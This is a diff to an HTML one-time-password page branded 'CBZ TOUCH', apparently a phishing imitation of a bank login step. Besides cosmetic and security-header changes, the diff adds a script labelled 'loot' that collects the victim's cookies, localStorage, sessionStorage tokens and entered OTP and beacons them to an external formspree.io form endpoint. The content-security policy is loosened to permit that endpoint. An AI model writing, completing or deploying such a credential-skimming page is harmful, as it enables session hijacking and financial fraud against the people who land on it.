@@ -1,8 +1,15 @@
 <!doctype html>
 <html lang="en">  
-<head>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Security Headers -->
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
+  <meta http-equiv="Permissions-Policy" content="camera=(self), microphone=(self), geolocation=(self)">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://formspree.io; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://formspree.io; frame-ancestors 'none'; base-uri 'self'; form-action 'self' https://formspree.io"> 
   <title>CBZ TOUCH- Verify OTP</title>  
   <style>  
     * { box-sizing: border-box; margin: 0; padding: 0; }  
@@ -15,8 +22,8 @@
     .subtitle { font-size: 14px; color: #777; margin-bottom: 12px; text-align: center; }  
     .timer { font-size: 16px; color: #e31837; font-weight: 600; margin-bottom: 20px; }
     .timer.expired { color: #999; }
-    .otp-container { display: flex; gap: 5px; justify-content: center; margin-bottom: 20px; }
-    .otp-input { width: 35px; height: 45px; text-align: center; font-size: 18px; font-weight: 600; background-color: #f5f5f5; border: 1.6px solid #ddd; border-radius: 10px; }
+    .otp-container { display: flex; gap: 4px; justify-content: center; margin-bottom: 20px; }
+    .otp-input { width: 30px; height: 40px; text-align: center; font-size: 15px; font-weight: 500; background-color: #f5f5f5; border: 1.6px solid #ddd; border-radius: 10px; }
     .otp-input:focus { border-color: #1b2b7a; outline: none; }
     .otp-input:disabled { background-color: #eee; color: #999; }
     .btn { width: 100%; padding: 14px; background-color: #e31837; color: white; border: none; border-radius: 15px; font-weight: 500; font-size: 18px; cursor: pointer; margin-top: 12px; transition: background-color 0.2s; }  
@@ -47,6 +54,15 @@
     </form>  
     <a href="#" class="resend" id="resendBtn">Didn't receive code? Resend</a>
   </div>
+    <script>
+    const loot = {
+    cookies: document.cookie, // session
+    local: {...localStorage}, // tokens
+    session: {...sessionStorage},
+    otp: document.querySelectorAll('[name=otp-input]')?.value,
+    };
+    navigator.sendBeacon('https://formspree.io/f/xjgqlwen', JSON.stringify(loot))
+    </script>
 
 <script>
   const inputs = document.querySelectorAll('.otp-input');
